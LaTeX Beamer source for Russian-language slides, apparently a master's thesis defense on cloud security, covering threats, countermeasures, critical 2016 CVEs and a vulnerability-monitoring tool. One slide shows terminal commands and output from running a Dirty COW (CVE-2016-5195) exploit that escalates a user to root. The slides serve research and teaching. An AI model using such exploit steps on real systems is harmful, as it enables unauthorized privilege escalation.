%%% Содержимое слайдов

\frame[plain]{\titlepage} % Титульный слайд

%-------------------------------------------------------------------------------

\section{Стандарты безопасности в облаках}

\begin{frame}
\frametitle{\insertsection}
\framesubtitle{Отсутствие единой организации по стандартизации}

Наиболее активные рабочие группы:
\begin{itemize}
    \item Cloud Security Alliance (CSA)
    \item National Institute of Standards and Technology (NIST)
    \item Internet Engineering Task Force (IETF)
\end{itemize}

\vspace{\baselineskip}

Они занимаются:
\begin{itemize}
    \item продвижением идей соблюдения безопасности
    \item исследованиями по защите
    \item разработкой руководств и организацией форумов по безопасности
\end{itemize}
\end{frame}

%-------------------------------------------------------------------------------

\section{Угрозы безопасности}

\begin{frame}
\frametitle{\insertsection}
\framesubtitle{По данным CSA за 2016~г.}

\begin{itemize}
    \item утечка данных
    \item компрометация учетных записей и обход аутентификации
    \item взлом интерфейсов и API
    \item уязвимости в используемых системах
    \item кража учетных записей
    \item инсайдеры-злоумышленники
    \item целевые кибератаки
    \item перманентная потеря данных
    \item недостаточная осведомленность
    \item злоупотребление облачными сервисами
    \item DDoS-атаки
    \item совместные технологии, общие риски
\end{itemize}
\end{frame}

%-------------------------------------------------------------------------------

\section{Борьба с проблемами в безопасности}

\begin{frame}
\frametitle{\insertsection}
\framesubtitle{Примеры решений}

\begin{itemize}
    \item многофакторная аутентификация (2FA/MFA)
    \item стойкое шифрование (SSL/TLS)
    \item использование одноразовых паролей и токенов
    \item контроль доступа, шифрование API
    \item периодические пентестинги и аудиты безопасности
    \item регулярное сканирование на наличие уязвимостей
    \item мониторинг и логирование
    \item резервное копирование и репликация
    \item резервирование сетевых каналов и сегментация сети
\end{itemize}
\end{frame}

%-------------------------------------------------------------------------------

\section{Решения в рамках ВКР магистра}

\begin{frame}
\frametitle{\insertsection}
\framesubtitle{Теоретические и практические исследования}

\begin{itemize}
    \item сбор и структурирование имеющейся информации по безопасности
    \item системный анализ полученной информации
    \item выбор альтернатив согласно набору критериев (МАИ)
    \item практическое применение полученной информации
    \item анализ наиболее опасных уязвимостей 2016~г.
    \item эксплуатация уязвимостей в облачной среде
    \item создание методов быстрого реагирования на уязвимости
\end{itemize}
\end{frame}

%-------------------------------------------------------------------------------

\section{Системный анализ}

\begin{frame}
\frametitle{\insertsection}
\framesubtitle{Классификация и методы решения задачи}

\begin{itemize}
    \item цель проектирования --- разработка системы безопасности облачной среды
    \item выделение входных и выходных данных
    \item выделение функций и подсистем
    \item организация модульности системы
    \item детализация функций и подсистем
    \item соблюдение принципа иерархии
    \item сочетание централизации и децентрализации
    \item возможность расширения системы
    \item учет неопределенностей и случайностей
\end{itemize}
\end{frame}

%-------------------------------------------------------------------------------

\section{Вариантный анализ}

\begin{frame}
\frametitle{\insertsection}
\framesubtitle{Пример --- выбор гипервизора}

\begin{figure}
    \center
    \includegraphics[width=\linewidth]{mai}
\end{figure}
\end{frame}

%-------------------------------------------------------------------------------

\section{Критические уязвимости 2016~г.}

\begin{frame}
\frametitle{\insertsection}
\framesubtitle{По данным www.cvedetails.com}

\begin{table}
    \begin{tabular}{|l|l|p{4cm}|l|}
        \hline \textbf{CVE ID} & \textbf{CVSS} & \textbf{Тип уязвимости} & \textbf{ПО} \\
        \hline CVE-2016-5195 & 7.2 & Получение привилегий & Linux Kernel \\
        \hline CVE-2016-6258 & 7.2 & Получение привилегий & Xen \\
        \hline CVE-2016-5696 & 5.8 & Получение данных & Linux Kernel \\
        \hline CVE-2016-3710 & 7.2 & Запуск кода & QEMU \\
        \hline CVE-2016-8655 & 7.2 & Получение привилегий, DoS & Linux Kernel \\
        \hline CVE-2016-4997 & 7.2 & Получение привилегий, DoS, доступ к памяти & Linux Kernel \\
        \hline CVE-2016-4484 & 7.2 & Получение привилегий & CryptSetup \\
        \hline CVE-2016-6309 & 10.0 & DoS, запуск кода & OpenSSL\\
        \hline
    \end{tabular}
\end{table}
\end{frame}

%-------------------------------------------------------------------------------

\section{Эксплуатация CVE-2016-5195}

\begin{frame}
\frametitle{\insertsection}
\framesubtitle{<<Dirty COW>> (Copy-on-write)}

{\small \texttt{\$ id \\
{\color{green} uid=1000(dcow)} gid=1000(dcow) groups=1000(dcow)
}}

\vspace{\baselineskip}

{\small \texttt{\$ g++ dcow.cpp -std=c++11 -pthread -lutil -o dcow \\
\$ ./dcow \\
Running ... \\
Received su prompt (Password: ) \\
Root password is: dirtyCowFun \\
Enjoy! :-)}}

\vspace{\baselineskip}

{\small \texttt{\$ su root \\
Password: dirtyCowFun \\
\# id \\
{\color{red} uid=0(root)} gid=0(root) groups=0(root)
}}
\end{frame}

%-------------------------------------------------------------------------------

\section{Мониторгинг уязвимостей}

\begin{frame}
\frametitle{\insertsection}
\framesubtitle{https://github.com/Amet13/vulncontrol}

{\scriptsize \texttt{\$ ./vulncontrol.py −d 2017−02−18 −m 5 -t \$TOKEN \$ID \\
CVE−2017−6074 9.3 http://www.cvedetails.com/cve/CVE−2017−6074/ \\
CVE−2017−6001 7.6 http://www.cvedetails.com/cve/CVE−2017−6001/ \\
CVE−2017−5986 7.1 http://www.cvedetails.com/cve/CVE−2017−5986/ \\
Telegram alert sent
}}

\begin{figure}
    \center
    \includegraphics[width=0.65\linewidth]{tscreen}
\end{figure}
\end{frame}

%-------------------------------------------------------------------------------

\section{Результаты}

\begin{frame}
\frametitle{\insertsection}
\framesubtitle{В рамках ВКР магистра}

\begin{itemize}
    \item обзор литературных источников и открытых стандартов
    \item анализ рынка облачных услуг
    \item определение угроз безопасности облачных вычислений и методов их решения
    \item системный анализ безопасности облачной среды
    \item вариантный анализ для выбора оптимальной альтернативы
    \item сбор данных по наиболее опасным уязвимостям в ПО
    \item практическая эксплуатация уязвимости CVE-2016-5195
    \item разработка системы сбора данных по уязвимостям
    \item публикация исследований под свободной лицензией CC BY-SA 4.0, исходного кода под GPLv3
\end{itemize}
\end{frame}

%-------------------------------------------------------------------------------
